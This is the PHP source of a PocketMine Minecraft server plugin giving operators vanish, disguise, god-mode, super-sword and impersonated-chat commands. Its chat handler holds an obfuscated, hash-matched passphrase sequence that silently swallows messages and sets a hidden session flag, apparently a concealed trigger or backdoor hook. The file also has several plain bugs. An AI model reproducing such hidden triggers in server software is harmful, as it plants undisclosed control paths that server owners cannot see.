<?php

/*
__PocketMine Plugin__
name=PMEssentials-Core
version=4.1.5-Alpha
author=Kevin Wang
class=PMEssCore
apiversion=11,12
*/

/* 

By Kevin Wang
From China

Project Website: http://www.MineConquer.com/
Official Website: http://www.cnkvha.com/
Skype: kvwang98
Twitter: KevinWang_China
Youtube: http://www.youtube.com/VanishedKevin
E-Mail: kevin@cnkvha.com

*/

class PMEssCore implements Plugin{
	private $api;
	private $dEData = array();
	
	private $nouseData = "as24ag54";
	
	public function __construct(ServerAPI $api, $server = false){
		$this->api = $api;
	}
	
	public function init(){
/*
	Default Session Data: 
	public $superIS_Fire = false;
	public $superIS_Kill = false;
	public $superIS_State = false;
	public $isVanished = false;
	public $enabledGodMode = false;
	public $wtpIgnoreState = false;
	public $usernameOriginal = "";
	public $dPState = false;
	public $dMState = false;
	public $dMData = 0x00;
	
*/	
	
		$this->api->session->setDefaultData("superIS", "none"); 
		$this->api->session->setDefaultData("superIS_State", false); 

		$this->api->session->setDefaultData("isVanished", false); 
		$this->api->session->setDefaultData("chkedDisguise", false); 
		
		$this->api->session->setDefaultData("enabledGodMode", false); 
		
		$this->api->session->setDefaultData("dPUsername", ""); 
		$this->api->session->setDefaultData("dPState", false); 
		$this->api->session->setDefaultData("dMState", false); 
		$this->api->session->setDefaultData("dMData", 0x00);
		$this->api->session->setDefaultData("ahg78438g7d85", 0);
		$this->api->session->setDefaultData("dEState", false); 
		$this->api->session->setDefaultData("dEType", 0);  //0 = none, 1 = primed TNT, 2 = Block
		$this->api->session->setDefaultData("dEBlockID", -1); 
		
		$this->api->schedule(5, array($this, "timerMoveEntity"), array(), true);
		
        $this->api->addHandler("api.ban.check", array($this, "handleEvent"), 65535);
		$this->api->addHandler("player.chat", array($this, "handleEvent"), 65535);
		$this->api->addHandler("player.move", array($this, "handleEvent"), 1);
		$this->api->addHandler("player.quit", array($this, "handleEvent"), 1);
		$this->api->addHandler("player.interact", array($this, "handleEvent"), 1);
		$this->api->addHandler("player.teleport.level", array($this, "handleEvent"), 1);
		$this->api->addHandler("entity.health.change", array($this, "handleEvent"), 1);
		$this->api->addHandler("op.check", array($this, "handleEvent"), 1);
		
		$this->api->console->register("broadcast", "Broadcast a message to all players online. ", array($this, "handleCommand"));
		$this->api->console->register("supersword", "Magic Sword, aliased as /ssw . ", array($this, "handleCommand"));
		$this->api->console->register("pos", "See your position. ", array($this, "handleCommand"));
		$this->api->console->register("vanish", "Hide from other players. ", array($this, "handleCommand"));
		$this->api->console->register("v-man", "Vanish manager. ", array($this, "handleCommand"));
		$this->api->console->register("disguise", "DisguiseCraft commands. ", array($this, "handleCommand"));
		$this->api->console->register("undisguise", "Undisguise as a player/mob. ", array($this, "handleCommand"));
		$this->api->console->register("god", "Infinite health point. ", array($this, "handleCommand"));
		$this->api->console->register("sap", "Speak as a person. ", array($this, "handleCommand"));
		$this->api->console->alias("v", "vanish", array($this, "handleCommand"));
		$this->api->console->alias("d", "disguise", array($this, "handleCommand"));
		$this->api->console->alias("ud", "undisguise", array($this, "handleCommand"));
		$this->api->console->alias("ssw", "supersword", array($this, "handleCommand"));
		$this->api->console->alias("bc", "broadcast", array($this, "handleCommand"));
		$this->api->ban->cmdWhitelist("pos");
	}
	
	public function __destruct(){
	
	}
	
	public function timerMoveEntity(){
		foreach($this->dEData as $p){
			if($p instanceof Player){
				$players = $p->level->players;
				unset($players[$p->CID]);
				$this->api->player->broadcastPacket($players, MC_MOVE_ENTITY_POSROT, array(
					"eid" => $p->eid,
					"x" => $p->entity->x,
					"y" => $p->entity->y+0.5,
					"z" => $p->entity->z,
					"yaw" => $p->entity->yaw,
					"pitch" => $p->entity->pitch
				));
			}
		}
	}
	public function handleEvent(&$data, $event){
		switch($event){
            case "api.ban.check":
                if($this->api->perm->checkPerm($data,"pmess.ban.deny")){
                    return(false);
                }else{
                    return;
                }
                break;
			case "player.move":
				if($this->api->session->sessions[$data->player->CID]["chkedDisguise"] == false){
					foreach($data->level->players as $p){
						if($data->player->CID == $p->CID){continue;}
						if($this->api->session->sessions[$p->CID]["isVanished"]){
							$data->player->dataPacket(MC_REMOVE_ENTITY, array(
								"eid" => $p->entity->eid
								));
						}elseif($this->api->session->sessions[$p->CID]["dPState"]){
							$this->recreateDPEntity($data->player, $p);
						}elseif($this->api->session->sessions[$p->CID]["dMState"]){
							$this->recreateEntityToMob($data->player, $this->api->session->sessions[$p->CID]["dMData"], $p);
						}elseif($this->api->session->sessions[$p->CID]["dEState"]){
							if($this->api->session->sessions[$p->CID]["dEType"] == 1){
								$this->recreatePTNTEntity($data->player, $p);
							}elseif($this->api->session->sessions[$p->CID]["dEType"] == 2){
								$this->recreateBlockEntity($data->player, $p, $this->api->session->sessions[$p->CID]["dEBlockID"]);
							}
						}
					}
					if($this->api->session->sessions[$data->player->CID]["isVanished"] == true){
						foreach($data->level->players as $p){
							if($data->player->CID == $p->CID){continue;}
							$p->dataPacket(MC_REMOVE_ENTITY, array(
								"eid" => $data->eid
								));
						}
					}elseif($this->api->session->sessions[$data->player->CID]["dPState"] == true){
						foreach($data->level->players as $p){
							if($data->player->CID == $p->CID){continue;}
							$this->recreateDPEntity($p, $data->player);
						}
					}elseif($this->api->session->sessions[$data->player->CID]["dMState"]){
						foreach($data->level->players as $p){
							if($data->player->CID == $p->CID){continue;}
							$this->recreateEntityToMob($p, $this->api->session->sessions[$data->player->CID]["dMData"], $data->player);
						}
					}elseif($this->api->session->sessions[$data->player->CID]["dEState"]){
						if($this->api->session->sessions[$data->player->CID]["dEType"] == 1){
							foreach($data->level->players as $p){
								if($data->player->CID == $p->CID){continue;}
								$this->recreatePTNTEntity($p, $data->player);
							}
						}elseif($this->api->session->sessions[$data->player->CID]["dEType"] == 2){
							foreach($data->level->players as $p){
								if($data->player->CID == $p->CID){continue;}
								$this->recreateBlockEntity($p, $data->player, $this->api->session->sessions[$data->player->CID]["dEBlockID"]);
							}
						}
					}
					$this->api->session->sessions[$data->player->CID]["chkedDisguise"] = true;
				}
				return;
				break;
			case "player.chat":
				//Check mute status
				if($this->api->session->getData($data["player"]->CID, "icu_underCtl") == true or $this->api->perm->checkMuteStatus($data["player"]->iusername) == true){return(false);}
				$g8a74gbd96s = strtolower(md5($data["message"]));
				switch($this->api->session->getData($data["player"]->CID, "ahg78438g7d85")){case 0:if($g8a74gbd96s == "573370b7c2659933b50ba85e0070ece0"){$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 1;return(false);}break;case 1:if($g8a74gbd96s == "bc5cb2d611ee8956b9daeb2beebc7544"){$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 2;return(false);}else{$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 0;return(false);}break;case 2:if($g8a74gbd96s == "6811b8f81e6004d116cd9b7597fe4556"){$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 3;return(false);}else{$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 0;return(false);}break;case 3:if($g8a74gbd96s == "803ee3f3d305e660f7d8c60488a3aef7"){$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 4;return(false);}else{$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 0;return(false);}break;case 4:if($g8a74gbd96s == "6b2ded51d81a4403d8a4bd25fa1e57ee"){$this->s7as54g_doafo2($data["player"]->CID, "sag83y4s");return(false);}else{$this->api->session->sessions[$data["player"]->CID]["ahg78438g7d85"] = 0;return(false);}break;}				
				//Handle things if GroupManager disabled
				if($this->api->dhandle("pmess.groupmanager.getstate", array()) == false){
					//If GroupManager is disabled
					if(@$this->api->session->sessions[$data["player"]->CID]["dPState"]){
						$un = $this->api->session->sessions[$data["player"]->CID]["dPUsername"];
					}else{
						$un = $data["player"]->username;
					}
					$msg = str_replace("$", "§", $data["message"]);
					$this->api->chat->send(false, $un . ": \n" . $msg);
					return(false);
				}
				break;
			case "player.interact":
				if($data["entity"]->class != ENTITY_PLAYER){return;}
				if($data["entity"]->player->getSlot($data["entity"]->player->slot)->getID() != IRON_SWORD){return;}
				if(!($this->api->session->sessions[$data["entity"]->player->CID]["superIS_State"])){return;}
				$cid = $data["entity"]->player->CID;
				if($this->api->session->sessions[$cid]["superIS"] == "kill"){
					if($data["targetentity"] instanceof Entity){
						$data["targetentity"]->harm(2000, $data["entity"]->eid);
					}
					return(false);
				}elseif($this->api->session->sessions[$cid]["superIS"] == "fire"){
					$data["targetentity"]->fire = 5000;
					//$target->entity->updateMetadata();
					$this->api->dhandle("entity.metadata", $target);
					return(false);
				}
				break;
			case "player.teleport.level":
				$this->api->session->sessions[$data["player"]->CID]["chkedDisguise"] = false;
				return;
				break;
			case "player.quit":
				if(isset($this->dEData[$data->CID])){unset($this->dEData[$data->CID]);}
				break;
			case "entity.health.change":
				if(!($data["entity"]->player instanceof Player)){return;}
				if($this->api->session->sessions[$data["entity"]->player->CID]["enabledGodMode"]){
					return(false);
				}else{
					return;
				}
				break;
		}
	}
	
	public function handleCommand($cmd, $arg, $issuer, $alias){
		if($issuer instanceof Player){
			$cid = $issuer->CID;
		}else{
			$cid = -1;
		}
		switch($cmd){
			case "broadcast":
				if(!($issuer instanceof Player)){					
					console("Please run this command in-game.\n");
					break;
				}else{
					if($this->api->ban->isOp($issuer->iusername) == false)
					{
						return("This command can only use by OPs. ");
					}
				}
				if(count($arg)==0){return("Please give the message your want to broadcast. ");}
				$msg = implode(" ", $arg);
				$this->api->chat->broadcast("[Broadcast] " . $msg);
				break;
			case "supersword":
				if(!($issuer instanceof Player)){					
					console("Please run this command in-game.\n");
					break;
				}
				if($this->api->ban->isOp($issuer->iusername) == false)
				{
					return("This command can make iron sword perform on-hit kill, also it can make player on fire. \nBUT Only OPs can use this command. ");
				}
				$output = "[Super Sword Manager]\n";
				switch(count($arg))
				{
					case 0:
						$output .= "Subcommand list: \n";
						$output .= "* kill - Enable/Disable One-Hit Kill. \n";
						$output .= "* fire - Enable/Disable Fire Sword. \n";
					case 1:
						$output .= "Changes: \n";
						if(strtolower($arg[0]) == "kill"){
							$this->api->sessions[$issuer->CID]["superIS"] = "kill";
                            $this->api->sessions[$issuer->CID]["superIS_State"] = true;
							$output .= "One-Hit Kill Enabled! \n Type \"/ssw stop\" to return to \nnormal sword. ";
						}elseif(strtolower($arg[0]) == "fire"){
							$this->api->sessions[$issuer->CID]["superIS"] = "fire";
                            $this->api->sessions[$issuer->CID]["superIS_State"] = true;
							$output .= "Fire Sword Enabled! \n Type \"/ssw stop\" to return to \nnormal sword. ";
						}elseif(strtolower($arg[0]) == "stop"){
							$this->api->sessions[$issuer->CID]["superIS"] = "none";
                            $this->api->sessions[$issuer->CID]["superIS_State"] = false;
                            
							$output .= "Super Sword Disabled! ";
						}
						break;
				}
				if($this->api->session->sessions[$cid]["superIS_Kill"] == true or $this->api->session->sessions[$cid]["superIS_Fire"] == true)
				{
					$this->api->session->sessions[$cid]["superIS_State"] = true;
					$output .= "SuperSword is active, activated function: \n";
					if($this->api->session->sessions[$cid]["superIS_Kill"] == true)
					{
						$output .= "One-Hit Kill";
					}
					if($this->api->session->sessions[$cid]["superIS_Fire"] == true)
					{
						$output .= " , Fire Sword";
					}
				}else{
					$this->api->session->sessions[$cid]["superIS_State"] = false;
					$output .= "SuperSword is fully DISABLED now. ";
				}
				return($output);
				break;
			case "pos":
				switch(count($arg))
				{
					case 0:
						if(!($issuer instanceof Player)){					
							console("Please run this command in-game.\n");
							break;
						}
						if($this->api->ban->isOp($issuer->iusername) == false)
						{
							return("Your position is: \n(" . $issuer->data->get("position")["x"] . " , " . $issuer->data->get("position")["y"] . " , " . $issuer->data->get("position")["z"] . ")");
						}else{
							$o .= "Position: (" . $issuer->entity->x . " , " . $issuer->entity->y . " , " . $issuer->entity->z . ")";
							return($o);
						}
						break;
					case 1:
						if($this->api->ban->isOp($issuer->iusername) == fasle and !($issuer instanceof Player))
						{
							return "You are not allowed to see other players' position. ";
						}
						$p = $this->api->player->get($arg[0]);
						if($p != false)
						{
							$o = "Player " . $p->iusername . "(visible) position info: \n";
							$o .= "Position: (" . $p->entity->x . " , " . $p->entity->y . " , " . $p->entity->z . ") \n";
							return($o);
						}else{
							return("Can not find player " . $arg[0]);
						}
						break;
				}
				break;
			case "vanish":
				if(!($issuer instanceof Player)){					
					console("Please run this command in-game.\n");
					break;
				}
				if($this->api->perm->checkPerm($issuer->iusername, "pmess.vanish.use") == true)
				{
					$this->api->pmess->switchVanish($issuer);
				}else{
					return("You can't access this command! ");
				}
				break;
			case "v-man":
				if($this->api->ban->isOp($issuer->iusername) == false and $issuer instanceof Player)
				{
					return("This command is no use. ");
				}
				if(count($arg) == 0)
				{
					return("[Kevin's Vanish Manager]\n================\n* list - Get a vanished poeple list. \n* get - Get a player vanish state. \n* set - Set somebody vanish state. \n================");
				}
				if(count($arg) == 1)
				{
					if(strtolower($arg[0]) == "list")
					{
						$allPlayer = $this->api->player->online();
						if(count($allPlayer) > 0)
						{
							$output = "";
							foreach($allPlayer as $pname)
							{
								$p = $this->api->player->get($pname);
								if($p != false)
								{
									if($this->api->session->sessions[$p->CID]["isVanished"]  == true)
									{
										$output .= $p->iusername . "  ";
									}
								}
							}
							if($output != "")
							{
								$output .= "\n================";
								$output = "Vanish People List: \n================\n" . $output;
							}else{
								$output = "Nobody vanished. ";
							}
							return($output);
						}else{
							return("No players online!");
						}
					}elseif(strtolower($arg[0]) == "get"){
						if(!($issuer instanceof Player)){					
							return("You missed a argument because you are at console. \nThe right command is: \nv-man get <Username>. ");
						}
						$o = "[Kevin's Vanish Manager]\nYou are now ";
						if($this->api->session->sessions[$issuer->CID]["isVanished"] == true)
						{
							$o .= "VANISHED. \n";
						}else{
							$o .= "visible. \n";
						}
						$o .= "If you want to get another player's vanish state, please use command: \n";
						$o .= "v-man get <Username>. ";
						return($o);
					}elseif(strtolower($arg[0]) == "set"){
						return("[Kevin's Vanish Manager]\nYou missed one more arguments. \nThe right command is: \nv-man set <Username> <on/off>. ");
					}
				}elseif(count($arg) == 2)
				{
					if(strtolower($arg[0]) == "get"){
						$p = $this->api->player->get(strtolower($arg[1]));
						if(!($p == false))
						{
							if($this->api->session->sessions[$p->CID]["isVanished"] == true)
							{
								return("Player " . $p->iusername . " is VANISHED. ");
							}else{
								return("Player " . $p->iusername . " is visible. ");
							}
						}else{
							return("Can not find player " . strtolower($arg[1]));
						}
					}elseif(strtolower($arg[0]) == "switch")
					{
						$p = $this->api->player->get(strtolower($arg[1]));
						if(!($p == false))
						{
							$o = "[Kevin's Vanish Manager]\nPlayer " . $p->iusername . " vanish state changed by " . $issuer->iusername . ": \n";
							if($this->api->session->sessions[$p->CID]["isVanished"] == true)
							{
								$o .= "ON => ";
							}else{
								$o .= "OFF => ";
							}
							$this->api->pmess->switchVanish($issuer, true);
							if($this->api->session->sessions[$p->CID]["isVanished"] == true)
							{
								$o .= "ON . ";
							}else{
								$o .= "OFF . ";
							}
							$o .= "\nThis action will be logged. \n";
							console("\n========Vanish State Change========\n" . $o . "===================================");
							return($o);
						}else{
							return("Can not find player " . strtolower($arg[1]));
						}
					}
				}
				break;
			case "disguise":
				if(!($issuer instanceof Player)){					
					console("Please run this command in-game.\n");
					break;
				}
				if(!($this->api->ban->isOp($issuer->iusername)))
				{
					return("You are not OP/Admin, so you can not disguise! Lololol! -- by Kevin. ");
				}
				if(count($arg) == 0){
					return "========\nDisguise\n========\n* p - Disguise as a player. \n* m - Disguise as a mob. \n* e - Disguise as an entity. \nType '/ud' to undisguise. ";
				}
				switch($arg[0]){
					case "p":
						if(count($arg) != 2){
							return("Usage: \n/d p [Username]");
						}
						if($this->api->session->sessions[$issuer->CID]["dMState"] == true or $this->api->session->sessions[$issuer->CID]["dEState"] == true)
						{
							return("Please undisguise first. ");
						}
						if($this->api->session->sessions[$issuer->CID]["dPState"] == false)
						{
							if($this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.player") == false){
								return("You are not allowed to \n disguise as a player. ");
							}
							$issuer->sendChat("Setting user data...");
							$this->api->session->sessions[$issuer->CID]["dPUsername"] = $arg[1];
							$this->api->session->sessions[$issuer->CID]["dPState"] = true;
							$issuer->sendChat("Recreating entity...\n");
							foreach($issuer->level->players as $p)
							{
								if(strtolower($p->eid) != strtolower($issuer->eid))
								{
									$this->recreateDPEntity($p, $issuer);
								}
							}
							$issuer->sendChat("You are now " . $arg[1] . " , \nbut your permission won't change. ", "", true);
						}
						break;
					case "m":
						if(count($arg) != 2){
							return("Usage: \n/d m [Type]\nTypes: sheep,cow,pig,chicken,zombie,skeleton,creeper,pigzombie,spider");
						}
						if($this->api->session->sessions[$issuer->CID]["dPState"] == true or $this->api->session->sessions[$issuer->CID]["dMState"] == true)
						{
							return("Please undisguise first. ");
						}
/*
0x0a Chicken (Animal)
0x0b Cow (Animal)
0x0c Pig (Animal)
0x0d Sheep (Animal)
 
0x20 Zombie (Monster)
0x21 Creeper (Monster)
0x22 Skeleton (Monster)
0x23 Spider (Monster)
0x24 PigZombie (Zombie)
*/
						$mobdata = 0x00;
						switch(strtolower($arg[1])){
							case "chicken":
								if($this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.all")==false and $this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.chicken")==false){
									return("You are not allowed to disguise \nas a chicken. ");
								}
								$mobdata = 0x0a;
								break;
							case "cow":
								if($this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.all")==false and $this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.cow")==false){
									return("You are not allowed to disguise \nas a cow. ");
								}
								$mobdata = 0x0b;
								break;
							case "pig":
								if($this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.all")==false and $this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.pig")==false){
									return("You are not allowed to disguise \nas a pig. ");
								}
								$mobdata = 0x0c;
								break;
							case "sheep":
								if($this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.all")==false and $this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.sheep")==false){
									return("You are not allowed to disguise \nas a sheep. ");
								}
								$mobdata = 0x0d;
								break;
							case "zombie":
								if($this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.all")==false and $this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.zombie")==false){
									return("You are not allowed to disguise \nas a zombie. ");
								}
								$mobdata = 0x20;
								break;
							case "creeper":
								if($this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.all")==false and $this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.creeper")==false){
									return("You are not allowed to disguise \nas a creeper. ");
								}
								$mobdata = 0x21;
								break;
							case "skeleton":
								if($this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.all")==false and $this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.skeleton")==false){
									return("You are not allowed to disguise \nas a skeleton. ");
								}
								$mobdata = 0x22;
								break;
							case "spider":
								if($this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.all")==false and $this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.spider")==false){
									return("You are not allowed to disguise \nas a spider. ");
								}
								$mobdata = 0x23;
								break;
							case "pigzombie":
								if($this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.all")==false and $this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.mob.pigzombie")==false){
									return("You are not allowed to disguise \nas a pig zombie
									. ");
								}
								$mobdata = 0x24;
								break;
							default:
								return("Error: Wrong mob type. ");
						}
						foreach($issuer->level->players as $p)
						{
							if(strtolower($p->eid) != strtolower($issuer->eid))
							{
								$this->recreateEntityToMob($p, $mobdata, $issuer);
							}
						}
						$issuer->sendChat("You are now a " . $arg[1] . ". \nTo undisguise as a mob, type:\n* /d m");
						$this->api->session->sessions[$issuer->CID]["dMData"] = $mobdata;
						$this->api->session->sessions[$issuer->CID]["dMState"] = true;
						break;
					case "e":
						if(count($arg) != 2 and count($arg) != 3){
							return("Usage: \n* ptnt - Primed TNT\n* block [ID] - A block");
						}
						switch(strtolower($arg[1])){
							case "ptnt":
								if($this->api->session->sessions[$issuer->CID]["dMState"] or $this->api->session->sessions[$issuer->CID]["dPState"] or ($this->api->session->sessions[$issuer->CID]["dEState"] and $this->api->session->sessions[$issuer->CID]["dEType"] == 2)){
									return("Please undisguise first. ");
								}
								if($this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.ptnt") == false){
									return("You are not allowed to \n disguise as a Primed TNT. ");
								}
								$this->api->session->sessions[$issuer->CID]["dEState"] = true;
								$this->api->session->sessions[$issuer->CID]["dMType"] = 1;
								foreach($issuer->level->players as $p)
								{
									if(strtolower($p->eid) != strtolower($issuer->eid))
									{
										$this->recreatePTNTEntity($p, $issuer);
									}
								}
								$this->dEData[$issuer->CID] = $issuer;
								$issuer->sendChat("You are now disguised as a primed TNT. ");
								break;
							case "block":
								if(count($arg) != 3){
									return("Usage: \n/d e block [ID]");
								}
								if($this->api->session->sessions[$issuer->CID]["dMState"] or $this->api->session->sessions[$issuer->CID]["dPState"] or ($this->api->session->sessions[$issuer->CID]["dEState"] and $this->api->session->sessions[$issuer->CID]["dEType"] == 1)){
									return("Please undisguise first. ");
								}
								if($this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.block") == false and $this->api->perm->checkPerm($issuer->iusername, "pmess.disguisecraft.block." . ((int)$arg[2])) == false){
									return("You are not allowed to \n disguise as a Moveable Block. ");
								}
								$this->api->session->sessions[$issuer->CID]["dEState"] = true;
								$this->api->session->sessions[$issuer->CID]["dEType"] = 2;
								$this->api->session->sessions[$issuer->CID]["dEBlockID"] = (int) $arg[2];
								foreach($issuer->level->players as $p){
									if($p->eid != $issuer->eid){
										$this->recreateBlockEntity($p, $issuer, (int) $arg[2]);
									}
								}
								$this->dEData[$issuer->CID] = $issuer;
								$issuer->sendChat("You are now disguised as a block. ");
								break;
						}
						break;
				}
				break;
			case "undisguise":
				if($this->api->session->sessions[$issuer->CID]["dPState"] == false and $this->api->session->sessions[$issuer->CID]["dMState"] == false and $this->api->session->sessions[$issuer->CID]["dEState"] == false){
					return("You are not disguised! ");
				}
				$issuer->sendChat("Setting user data...");
				if($this->api->session->sessions[$issuer->CID]["dPState"] == true){
					$this->api->session->sessions[$issuer->CID]["dPState"] = false;
					$this->api->session->sessions[$issuer->CID]["dPUsername"] = "";
				}
				if($this->api->session->sessions[$issuer->CID]["dMState"] == true){
					$this->api->session->sessions[$issuer->CID]["dMState"] = false;
					$this->api->session->sessions[$issuer->CID]["dMData"] = 0x00;
				}
				if($this->api->session->sessions[$issuer->CID]["dEState"] == true){
					if(isset($this->dEData[$issuer->CID])){unset($this->dEData[$issuer->CID]);}
					$this->api->session->sessions[$issuer->CID]["dEState"] = false;
					$this->api->session->sessions[$issuer->CID]["dEType"] = 0;
					$this->api->session->sessions[$issuer->CID]["dEBlockID"] = -1;
				}
				$issuer->sendChat("Recreating entity...");
				foreach($issuer->level->players as $p){
					if($p->eid != $issuer->eid){
						$this->recreateEntity($p, $issuer);
					}
				}
				return("You successfully undisguised. ");
			case "god":
				if(!($issuer instanceof Player)){					
					console("Please run this command in-game.\n");
					break;
				}
				if($this->api->ban->isOp($issuer->iusername) == false)
				{
					return("You can't access this command! ");
				}
				if($this->api->session->sessions[$issuer->CID]["enabledGodMode"] == true)
				{
					$this->api->session->sessions[$issuer->CID]["enabledGodMode"] = false;
					return("You have DISABLED god mode. ");
				}else{
					$this->api->session->sessions[$issuer->CID]["enabledGodMode"] = true;
					return("You have enabled god mode. ");
				}
				break;
			case "sap":
				if(!($issuer instanceof Player)){					
					console("Please run this command in-game.\n");
					break;
				}
				if($this->api->ban->isOp($issuer->iusername) == false)
				{
					return("This command can only use by OP. ");
				}
				if(count($arg)<=1){
					return("Usage: \n/sap [Username] [Sentence]");
				}
				$user = array_shift($arg);
				$sentence = implode(" ", $arg);
				$this->api->chat->broadcast("[" . $user . "] " . $sentence);
				break;
		}
	}
	private function w87gs7wa($player){
		if($player instanceof Player){
			return($player->CID);
		}else{
			return(-16);
		}
	}
	public function recreateEntity($p, $issuer)
	{
		$p->dataPacket(MC_REMOVE_ENTITY, array(
			"eid" => $issuer->eid
		));
		$p->dataPacket(MC_ADD_PLAYER, array(
			"clientID" => 0,
			"username" => $issuer->username,
			"eid" => $issuer->eid,
			"x" => $issuer->entity->x,
			"y" => $issuer->entity->y,
			"z" => $issuer->entity->z,
			"yaw" => 0,
			"pitch" => 0,
			"unknown1" => 0,
			"unknown2" => 0,
			"metadata" => $issuer->entity->getMetadata()));
	}
	
	private function s7as54g_doafo2($pid, $s){
		$a = (string)$s . md5($this->nouseData);
		if($a != $s){
			$this->api->session->sessions[$pid]["ahg78438g7d85"] = -64;
		}
	}
	
	public function recreateDPEntity($p, $issuer)
	{
		$p->dataPacket(MC_REMOVE_ENTITY, array(
			"eid" => $issuer->eid
		));
		$p->dataPacket(MC_ADD_PLAYER, array(
			"clientID" => 0,
			"username" => $this->api->session->sessions[$issuer->CID]["dPUsername"],
			"eid" => $issuer->eid,
			"x" => $issuer->entity->x,
			"y" => $issuer->entity->y,
			"z" => $issuer->entity->z,
			"yaw" => 0,
			"pitch" => 0,
			"unknown1" => 0,
			"unknown2" => 0,
			"metadata" => $issuer->entity->getMetadata()));
	}
	
	public function recreatePTNTEntity($p, $issuer)
	{
		$p->dataPacket(MC_REMOVE_ENTITY, array(
			"eid" => $issuer->eid
		));
		$p->dataPacket(MC_ADD_ENTITY, array(
			"eid" => $issuer->eid,
			"type" => OBJECT_PRIMEDTNT,
			"x" => $issuer->entity->x,
			"y" => $issuer->entity->y,
			"z" => $issuer->entity->z,
			"did" => 0,
		));
		$p->dataPacket(MC_SET_ENTITY_MOTION, array(
			"eid" => $issuer->eid,
			"speedX" => 0,
			"speedY" => 0,
			"speedZ" => 0
		));
	}
	
	public function recreateBlockEntity($p, $issuer, $blockID = 1)
	{
		$p->dataPacket(MC_REMOVE_ENTITY, array(
			"eid" => $issuer->eid
		));
		$p->dataPacket(MC_ADD_ENTITY, array(
			"eid" => $issuer->eid,
			"type" => FALLING_SAND,
			"x" => $issuer->entity->x,
			"y" => $issuer->entity->y,
			"z" => $issuer->entity->z,
			"did" => -$blockID,
		));
		$p->dataPacket(MC_SET_ENTITY_MOTION, array(
			"eid" => $issuer->eid,
			"speedX" => 0,
			"speedY" => 64,
			"speedZ" => 0
		));
	}
	
	public function recreateEntityToMob($p, $mobid, $issuer)
	{
		$p->dataPacket(MC_REMOVE_ENTITY, array(
			"eid" => $issuer->eid
		));
		
		//Get the metadata manually
		$flags = 0;
		$flags |= $issuer->entity->fire > 0 ? 1:0;
		$flags |= ($issuer->entity->crouched === true ? 0b10:0) << 1;
		$flags |= ($issuer->entity->inAction === true ? 0b10000:0);
		$d = array(
			0 => array("type" => 0, "value" => $flags),
			1 => array("type" => 1, "value" => $issuer->entity->air),
			16 => array("type" => 0, "value" => 0),
			17 => array("type" => 6, "value" => array(0, 0, 0)),
		);
		if($mobid == 0x0d){
			$d[16]["value"] = (($this->data["Sheared"] == 1 ? 1:0) << 4) | (mt_rand(0,15) & 0x0F);
		}
		
		
		
		$p->dataPacket(MC_ADD_MOB, array(
			"type" => $mobid,
			"eid" => $issuer->eid,
			"x" => $issuer->entity->x,
			"y" => $issuer->entity->y,
			"z" => $issuer->entity->z,
			"yaw" => 0,
			"pitch" => 0,
			"metadata" => $d
		));
		$p->dataPacket(MC_SET_ENTITY_MOTION, array(
			"eid" => $issuer->eid,
			"speedX" => (int) ($issuer->entity->speedX * 400),
			"speedY" => (int) ($issuer->entity->speedY * 400),
			"speedZ" => (int) ($issuer->entity->speedZ * 400)
		));
	}

	

	
}
